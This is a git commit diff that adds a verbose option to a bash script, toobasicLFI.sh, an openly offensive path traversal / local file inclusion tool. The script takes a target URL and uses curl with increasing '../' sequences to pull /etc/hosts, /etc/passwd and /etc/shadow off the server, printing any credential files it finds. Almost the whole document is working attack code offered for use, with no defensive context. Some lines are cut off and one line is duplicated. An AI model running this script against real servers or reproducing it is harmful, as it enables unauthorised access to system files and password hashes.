009fcf3645ba1285191a191eef8a8f637dae848b
enforcerh4 <enforcer_h4@outlook.com>
2025-04-23 15:53:46 +0200

    Verbose mode to chill

--- toobasicLFI.sh
+++ toobasicLFI.sh
@@ -15,17 +15,23 @@ echo "╋┏┓┏┓  ┣┓┏┓┏┓┏  ┃╋┓  ╋┏┓┏┓┃"
 echo "┗┗┛┗┛  ┗┛┗┻┛┗┗  ┗┛┗  ┗┗┛┗┛┗"
 echo
 echo "Welcome back dude, ensure to enter the target url correctly (IT MUST FINISH BY = IN ORDER TO PERFORM THE ATT>
-echo   
-echo
+echo 
 
-
+verbose=false
 depth=5
+
+verbose(){
+if [[ $verbose == true ]]; then 
+echo -e "${YELLOW}[VERBOSE] $1${RESET}"
+fi 
+}
 
 show_help(){
 echo "By default this program will try path traversal with common lfi. Take a look if you want to perform  a diffe>
 echo " -h, --help           Display a short man"
 echo " -u, --url [URL]      Specify target URL"
 echo " -r, --recursion [N]  Choose recursion depth  (N has to be a integer)"
+echo " -v, --verbose        Enable verbose mode"
 }
 
 if [[ $# -eq 0 ]]; then 
@@ -52,13 +58,16 @@ fi
 
         -u | --url)
 if [[ -n "$2" && "$2" != -* ]]; then
-
 url="$2"
 shift 2
 else
 echo "Dumb error : -u needs an argument"
 exit 1
 fi
+;;
+        -v | --verbose)
+verbose=true
+shift
 ;;
 *)
 echo "Unknown option: $1"
@@ -67,17 +76,22 @@ exit 1
 esac 
 done 
 
-echo "Launching with following parameters:"
+echo "--------------------------------------------------------------"       
+echo "Launching script with following parameters:"
 echo "URL :${url:-not specified}"
 echo "Recursion depth : $depth"
+echo "--------------------------------------------------------------"
+ 
+echo 
 
-echo "Requesting the server which methods are allowed..."
+verbose "Requesting the server which methods are allowed..."
 
 connexion_test=$(curl -o /dev/null -w "%{http_code}" "$url")
-
+echo
 echo "Code "$connexion_test""
+echo
 if [ "$connexion_test" -ge 408 ] || [ "$connexion_test" -eq 0 ]; then 
-echo -e "${RED}Maybe you should think about having an actual connexion lmao (check your fucking interfaces man)${R>
+echo -e "${RED}${BOLD}Maybe you should think about having an actual connexion lmao (check your fucking interfaces >
 exit 1
 
 else
@@ -85,13 +99,13 @@ else
         methods=$(curl -s -I -X OPTIONS "$url" | grep  -i  "Allow:")
         if  [ -n "$methods" ]; then 
                 if  echo  "$methods" | grep  -i "POST" ; then 
-                echo -e "${GREEN}Request POST allowed{RESET}"
+                verbose "${GREEN}Request POST allowed{RESET}"
         fi
         if  echo  "$methods" | grep  -i "GET" ; then 
-                echo -e "${GREEN}Request GET allowed${RESET}"
+                verbose "${GREEN}Request GET allowed${RESET}"
         fi
-        if  echo "$methods" | grep -i "HEAD" ;then 
-                echo -e "${GREEN}Request HEAD allowed${RESET}"
+ if  echo "$methods" | grep -i "HEAD" ;then 
+                verbose "${GREEN}Request HEAD allowed${RESET}"
         fi
  
         else 
@@ -101,26 +115,29 @@ fi
 
 echo 
 echo "How deep is your love, my deer?" 
-
-echo "If you didn't choose a recursion level it's automatically set to 5" 
+echo
+echo -e "${YELLOW}If you didn't choose a recursion level it's automatically set to 5${RESET}"
+echo 
 for ((i=1; i<=depth; i++)); do
     query=$(printf '../%.0s' $(seq 1 $i))"etc/hosts" 
     url2="${url}${query}"
-    echo -e "${YELLOW}Stade ${i} recursion${RESET}"
-    echo "$url2" 
-    echo "Searching for /etc/hosts file..."
+    verbose -e "${YELLOW}Stade ${i} recursion${RESET}"
+    verbose "$url2" 
+    verbose "Searching for /etc/hosts file..."
     file=$(curl -s "$url2")
     if echo "$file" | grep -q -i "localhost" ; then 
         echo -e "${GREEN}${BOLD}It seems we find something interesting${RESET}"
         print=$(curl -s "$url2")
         echo -e "${GREEN}$print${RESET}"
 
-        echo "Now that you know how deep is your love, you can probably fish other files such as /etc/passwd or /e>
-        echo "Have a wonderful look dude"
+        verbose "Now that you know how deep is your love, you can probably fish other files such as /etc/passwd or>
+        
+echo
+echo "Have a wonderful look dude"
 
-        echo "Let's try something else"
+        verbose "Let's try something else"
         echo
-        echo "Searching for /etc/passwd file..." 
+        verbose "Searching for /etc/passwd file..." 
         query2=$(printf '../%.0s' $(seq 1 $i))"etc/passwd" 
         url3="${url}${query2}"
         file2=$(curl -s "$url3")
@@ -130,20 +147,21 @@ for ((i=1; i<=depth; i++)); do
             echo
             echo -e "${GREEN}$print2${RESET}"
 
-            echo "Trying to find hashed creds (basically searching for /etc/shadow)"
+            verbose "Trying to find hashed creds (basically searching for /etc/shadow)"
             query3=$(printf '../%.0s' $(seq 1 $i))"etc/shadow"
+query3=$(printf '../%.0s' $(seq 1 $i))"etc/shadow"
             url4="${url}${query3}"
             file3=$(curl "$url4")
             if echo "$file3" | grep -q -i "root" ; then 
                 print3=$(curl -s "$url4")
                 echo -e "${GREEN}$print3${RESET}"
             else 
-                echo -e "${RED}No /etc/shadow file found at this recursion level ${RESET}"
+                verbose  "${RED}No /etc/shadow file found at this recursion level ${RESET}"
             fi
         else
-            echo -e "${RED}No /etc/passwd file found.${RESET}"
+            verbose  "${RED}No /etc/passwd file found.${RESET}"
         fi
     else
-        echo -e "${RED}Gotta dive deeper, my friend${RESET}"
+        verbose "${RED}Gotta dive deeper, my friend${RESET}"
     fi 
 done
